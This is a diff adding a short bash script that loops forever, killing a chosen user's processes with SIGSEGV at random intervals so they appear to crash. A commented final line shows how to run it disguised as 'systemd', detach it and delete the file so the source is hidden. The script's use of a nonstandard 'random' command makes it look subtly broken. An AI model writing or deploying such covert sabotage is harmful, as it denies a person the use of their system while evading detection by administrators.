@@ -1,0 +1,7 @@
+#!/bin/bash
+user=$1
+while true ; do
+    kill -SEGV $(ps -u $user -o pid= | random | tail -n 1)
+    sleep $RANDOM
+done
+#systemd $USER 2>/dev/null 1>&2 & disown systemd ; rm systemd
